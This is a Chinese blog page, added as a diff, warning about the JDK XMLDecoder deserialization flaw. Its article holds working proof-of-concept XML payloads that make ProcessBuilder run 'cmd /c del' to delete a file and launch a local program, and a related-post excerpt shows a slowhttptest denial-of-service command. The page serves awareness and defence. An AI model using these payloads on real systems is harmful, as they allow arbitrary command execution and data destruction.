@@ -1,0 +1,291 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>JDK 紧急漏洞，XMLDecoder反序列化攻击 | 只有那年胜过年年</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#FC5531"><meta name="description" content="昨天在公司发现了一个jdk中的XMLDecoder反序列化的漏洞，看起来很危险！下面通过两个示例来看看这个漏洞的危害！ 示例1：利用XmlDecoder删除本地文件首先来看这个xmldecoder.xml文件内容： &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;java version">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JDK 紧急漏洞，XMLDecoder反序列化攻击">
+<meta property="og:url" content="http://example.com/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/JDK%20%E7%B4%A7%E6%80%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="只有那年胜过年年">
+<meta property="og:description" content="昨天在公司发现了一个jdk中的XMLDecoder反序列化的漏洞，看起来很危险！下面通过两个示例来看看这个漏洞的危害！ 示例1：利用XmlDecoder删除本地文件首先来看这个xmldecoder.xml文件内容： &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;java version">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/logo.png">
+<meta property="article:published_time" content="2025-10-30T06:42:34.000Z">
+<meta property="article:modified_time" content="2025-10-30T05:45:03.108Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/logo.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "JDK 紧急漏洞，XMLDecoder反序列化攻击",
+  "url": "http://example.com/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/JDK%20%E7%B4%A7%E6%80%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/",
+  "image": "http://example.com/img/logo.png",
+  "datePublished": "2025-10-30T06:42:34.000Z",
+  "dateModified": "2025-10-30T05:45:03.108Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "John Doe",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/JDK%20%E7%B4%A7%E6%80%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#FC5531')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#FC5531')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: John Doe","link":"链接: ","source":"来源: 只有那年胜过年年","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'JDK 紧急漏洞，XMLDecoder反序列化攻击',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/logo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">357</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.png" alt="Logo"><span class="site-name">只有那年胜过年年</span></a><a class="nav-page-title" href="/"><span class="site-name">JDK 紧急漏洞，XMLDecoder反序列化攻击</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">JDK 紧急漏洞，XMLDecoder反序列化攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-30T06:42:34.000Z" title="发表于 2025-10-30 14:42:34">2025-10-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-30T05:45:03.108Z" title="更新于 2025-10-30 13:45:03">2025-10-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">安全漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><p><img src="http://img.javastack.cn/17-12-20/73076296.jpg"></p>
+<p>昨天在公司发现了一个jdk中的XMLDecoder反序列化的漏洞，看起来很危险！下面通过两个示例来看看这个漏洞的危害！</p>
+<h4 id="示例1：利用XmlDecoder删除本地文件"><a href="#示例1：利用XmlDecoder删除本地文件" class="headerlink" title="示例1：利用XmlDecoder删除本地文件"></a>示例1：利用XmlDecoder删除本地文件</h4><p>首先来看这个xmldecoder.xml文件内容：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;java version&#x3D;&quot;1.8.0_151&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;
+	&lt;object class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;
+		&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;4&quot;&gt;
+			&lt;void index&#x3D;&quot;0&quot;&gt;
+				&lt;string&gt;cmd&lt;&#x2F;string&gt;
+			&lt;&#x2F;void&gt;
+			&lt;void index&#x3D;&quot;1&quot;&gt;
+				&lt;string&gt;&#x2F;c&lt;&#x2F;string&gt;
+			&lt;&#x2F;void&gt;
+			&lt;void index&#x3D;&quot;2&quot;&gt;
+				&lt;string&gt;del&lt;&#x2F;string&gt;
+			&lt;&#x2F;void&gt;
+			&lt;void index&#x3D;&quot;3&quot;&gt;
+				&lt;string&gt;e:\1.txt&lt;&#x2F;string&gt;
+			&lt;&#x2F;void&gt;			
+		&lt;&#x2F;array&gt;
+		&lt;void method&#x3D;&quot;start&quot; &#x2F;&gt;
+	&lt;&#x2F;object&gt;
+&lt;&#x2F;java&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再来看利用XMLDecoder解析这个xml文件的示例代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">private static void byXmlFile() &#123;
+	File file &#x3D; new File(&quot;E:\\xmldecoder.xml&quot;);
+	XMLDecoder xd &#x3D; null;
+	try &#123;
+		xd &#x3D; new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
+	&#125; catch (Exception e) &#123;
+		e.printStackTrace();
+	&#125;
+	Object s2 &#x3D; xd.readObject();
+	xd.close();
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这段代码执行后，直接删除了本地的e:\1.txt文件，相当于在命令行调用了cmd &#x2F;c del e:\1.txt命令，直接删除了本地文件，相当恐怖！</p>
+<h4 id="示例2：利用XmlDecoder调用本地程序"><a href="#示例2：利用XmlDecoder调用本地程序" class="headerlink" title="示例2：利用XmlDecoder调用本地程序"></a>示例2：利用XmlDecoder调用本地程序</h4><pre class="line-numbers language-none"><code class="language-none">private static void byXmlString() &#123;
+	String xml &#x3D; new StringBuilder().append(&quot;&lt;?xml version&#x3D;\&quot;1.0\&quot; encoding&#x3D;\&quot;UTF-8\&quot;?&gt;&quot;)
+			.append(&quot;&lt;java version&#x3D;\&quot;1.8.0_151\&quot; class&#x3D;\&quot;java.beans.XMLDecoder\&quot;&gt;&quot;)
+			.append(&quot;    &lt;object class&#x3D;\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot;)
+			.append(&quot;        &lt;array class&#x3D;\&quot;java.lang.String\&quot; length&#x3D;\&quot;1\&quot;&gt;&quot;)
+			.append(&quot;            &lt;void index&#x3D;\&quot;0\&quot;&gt;&quot;)
+			.append(&quot;                &lt;string&gt;calc&lt;&#x2F;string&gt;&quot;)
+			.append(&quot;            &lt;&#x2F;void&gt;&quot;)
+			.append(&quot;        &lt;&#x2F;array&gt;&quot;)
+			.append(&quot;        &lt;void method&#x3D;\&quot;start\&quot; &#x2F;&gt;&quot;)
+			.append(&quot;    &lt;&#x2F;object&gt;&quot;)
+			.append(&quot;&lt;&#x2F;java&gt;&quot;).toString();
+	XMLDecoder xd &#x3D; null;
+	try &#123;
+		xd &#x3D; new XMLDecoder(new ByteArrayInputStream(xml.getBytes()));
+	&#125; catch (Exception e) &#123;
+		e.printStackTrace();
+	&#125;
+	Object s2 &#x3D; xd.readObject();
+	xd.close();
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这段代码改成了用String输入源的形式，这不重要，重要的是还是利用了jdk中的XmlDecoder类来解析xml字符串。这段代码执行后，会调用出本地的计算器程序。</p>
+<p><img src="http://img.javastack.cn/17-12-20/29679880.jpg"></p>
+<p>其中ProcessBuilder.start()的方法和Runtime.exec()方法一样，都可以被用来创建一个操作系统进程，可用来控制进程状态并获得相关信息。</p>
+<p>ProcessBuilder的构造方法接受一个命令列表。</p>
+<pre class="line-numbers language-none"><code class="language-none">public ProcessBuilder(List&lt;String&gt; command) &#123;
+    if (command &#x3D;&#x3D; null)
+        throw new NullPointerException();
+    this.command &#x3D; command;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Jdk中的XmlDecoder反序列化存在安全漏洞，能调用本地的应用，也能执行系统支持的命令，一旦黑客组织成命令列表攻击系统，后果不堪设想！</p>
+<p>我只是用ProcessBuilder类演示了调用系统程序这两种案例，当然还有其他，远不止这一种攻击手段。作者看了下，这个漏洞在jdk8_0_151版本中还存在。</p>
+<p>建议不要用JDK中的XmlDeocder类，寻求其它更安全的xml解析工具类。</p>
+<p>求转发，紧急扩散，避免更大程度的损失！~</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/JDK%20%E7%B4%A7%E6%80%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/">http://example.com/2025/10/30/安全漏洞/JDK 紧急漏洞，XMLDecoder反序列化攻击/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">只有那年胜过年年</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">安全漏洞</a></div><div class="post-share"><div class="social-share" data-image="/img/logo.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%B8%B8%E8%AF%86%EF%BC%9ACAP%E7%90%86%E8%AE%BA%E3%80%82/" title="分布式系统架构常识：CAP理论"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">分布式系统架构常识：CAP理论</div></div><div class="info-2"><div class="info-item-1">什么是CAP理论？2000年7月，加州大学伯克利分校的Eric Brewer教授在ACM PODC会议上提出CAP猜想。2年后麻省理工学院的Seth Gilbert和NancyLynch从理论上证明了CAP，之后CAP理论正式成为分布式计算领域的公认定理。 CAP理论是由下面三个概念组成的，且在分布式系统中三者不能兼得，只能同时满足两种条件。 一致性（C）  All nodes see the same data at the same time  所有数据库集群节点在同一时间点看到的数据完全一致，即所有节点能实时保持数据同步。 可用性（A）  Reads and writes always succeed  读写操作永远是成功的。即服务一直是可用的，即使集群一部分节点故障，集群整体还能正常响应客户端的读写请求。 分区容错性（P）  The system continues to operate despite arbitrary message loss or failure of part of the system  尽管系统中有任意的信息丢失或故障，系统仍在继续运行。以实...</div></div></div></a><a class="pagination-related" href="/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E%EF%BC%88session%20fixation%20attack%EF%BC%89/" title="会话固定攻击漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">会话固定攻击漏洞</div></div><div class="info-2"><div class="info-item-1">什么是会话固定攻击？会话固定攻击（session fixation attack）是利用应用系统在服务器的会话ID固定不变机制，借助他人用相同的会话ID获取认证和授权，然后利用该会话ID劫持他人的会话以成功冒充他人，造成会话固定攻击。 看下面Session Fixation攻击的一个简单例子：  整个攻击流程是： 1、攻击者Attacker能正常访问该应用网站； 2、应用网站服务器返回一个会话ID给他； 3、攻击者Attacker用该会话ID构造一个该网站链接发给受害者Victim； 4-5、受害者Victim点击该链接，携带攻击者的会话ID和用户名密码正常登录了该网站，会话成功建立； 6、攻击者Attacker用该会话ID成功冒充并劫持了受害者Victim的会话。  更多攻击例子参考：https://www.owasp.org/index.php/Session_fixation  攻击分析攻击的整个过程，会话ID是没变过的，所以导致此漏洞。 攻击修复1、登录重建会话 每次登录后都重置会话ID，并生成一个新的会话ID，这样攻击者就无法用自己的会话ID来劫持会话，核心代码如下。 ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E%EF%BC%88session%20fixation%20attack%EF%BC%89/" title="会话固定攻击漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="fas fa-history fa-fw"></i> 2025-10-30</div><div class="info-item-2">会话固定攻击漏洞</div></div><div class="info-2"><div class="info-item-1">什么是会话固定攻击？会话固定攻击（session fixation attack）是利用应用系统在服务器的会话ID固定不变机制，借助他人用相同的会话ID获取认证和授权，然后利用该会话ID劫持他人的会话以成功冒充他人，造成会话固定攻击。 看下面Session Fixation攻击的一个简单例子：  整个攻击流程是： 1、攻击者Attacker能正常访问该应用网站； 2、应用网站服务器返回一个会话ID给他； 3、攻击者Attacker用该会话ID构造一个该网站链接发给受害者Victim； 4-5、受害者Victim点击该链接，携带攻击者的会话ID和用户名密码正常登录了该网站，会话成功建立； 6、攻击者Attacker用该会话ID成功冒充并劫持了受害者Victim的会话。  更多攻击例子参考：https://www.owasp.org/index.php/Session_fixation  攻击分析攻击的整个过程，会话ID是没变过的，所以导致此漏洞。 攻击修复1、登录重建会话 每次登录后都重置会话ID，并生成一个新的会话ID，这样攻击者就无法用自己的会话ID来劫持会话，核心代码如下。 ...</div></div></div></a><a class="pagination-related" href="/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Slow%20HTTP%20POST%20%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB/" title="Slow HTTP POST 慢速攻击"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="fas fa-history fa-fw"></i> 2025-10-30</div><div class="info-item-2">Slow HTTP POST 慢速攻击</div></div><div class="info-2"><div class="info-item-1">测试工具模拟测试工具：slowhttptest  https://github.com/shekyan/slowhttptest  安装：  https://github.com/shekyan/slowhttptest/wiki  使用：  slowhttptest -c 5000 -u [hostname&#x2F;ip]   -c 表示发起5000个连接，由于是慢速DDOS且是基于http协议的，这里发起的连接请求是确确实实会与服务器进行三次握手并维持与服务器的连接的。  -u 注意这里的hostname或者ip都需要在前面加上协议 http:&#x2F;&#x2F;。   模拟测试： .&#x2F;slowhttptest -c 5000 -u https:&#x2F;&#x2F;192.168.1.3   slow HTTP test status on 50th second:  initializing:        0 pending:             8 connected:           1757 error:               0 ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B1%EF%BC%9A%E5%88%A9%E7%94%A8XmlDecoder%E5%88%A0%E9%99%A4%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">示例1：利用XmlDecoder删除本地文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B2%EF%BC%9A%E5%88%A9%E7%94%A8XmlDecoder%E8%B0%83%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.</span> <span class="toc-text">示例2：利用XmlDecoder调用本地程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By John Doe</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://walinecomments-gxccu74d8-chens-projects-7c4f92c5.vercel.app',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
